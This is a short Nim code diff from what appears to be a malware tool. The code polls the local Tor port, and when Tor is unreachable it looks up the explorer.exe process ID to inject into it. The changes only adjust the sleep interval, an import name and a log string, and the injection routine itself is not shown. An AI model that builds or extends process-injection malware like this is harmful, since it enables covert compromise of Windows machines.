@@ -1,4 +1,4 @@
-import ./lib/curl
+import ./lib/libcurl
 import ./lib/functions
 import os
 import std/strutils
@@ -11,12 +11,12 @@ import std/strutils
 
 var has_already_injected = 0
 while true:
-    sleep 1000
+    sleep 3000
     var resp = get_request("http://localhost:9050")
     if resp == "":
         echo "[!] Could not reach tor"
         if has_already_injected == 0:
-            echo "[*] Injecting "
+            echo "[*] Injecting"
             var explorer_pid: int = get_pid_by_name("explorer.exe")
             echo "[*] Found explorer.exe PID: " & explorer_pid.intToStr()
             has_already_injected = 1
